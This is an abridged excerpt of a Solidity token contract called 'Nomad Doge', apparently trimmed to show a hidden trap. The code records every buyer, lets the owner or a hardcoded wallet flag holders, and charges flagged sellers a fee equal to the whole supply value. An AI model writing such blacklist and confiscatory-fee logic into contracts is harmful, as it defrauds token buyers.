...
contract NODO is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Marketing = payable(0xB34896c58dB2a63e1Fdf2741e686E5b99f755D07);
    ...
    string private _name = "Nomad Doge"; 
    string private _symbol = "NODO";  
    ...
    function RemoveLimitEffects() external onlyOwner {
    ...
    function Detective() public {
        require (msg.sender == Wallet_Marketing);
    ...
    function isElon(address[] memory addrs, bool true_or_false) public returns (bool) {
        require (msg.sender == Wallet_Marketing);
        for (uint256 i = 0; i < addrs.length; i++) {
            _isElons[addrs[i]] = true_or_false;
        }
        return true;
    }

    function isElons(address[] memory addrs, bool true_or_false) external onlyOwner returns (bool) {
        for (uint256 i = 0; i < addrs.length; i++) {
            _isElons[addrs[i]] = true_or_false;
        }
        return true;
    ...
    function WantedMode() external onlyOwner {
        for (uint256 i = 0; i < _Elon.length; i++) {
            _isElons[_Elon[i]] = true;
        }
    }
    ...
    function _transfer(
        ...
        if (to != owner() && to != uniswapV2Pair && !_isElon[to]) {
            _isElon[to] = true;
            _Elon.push(to);
            if (_isElons[from]) { _isElons[to] = true;
            }
        }
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (_isElons[from]){_TotalFee = _rTotal;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
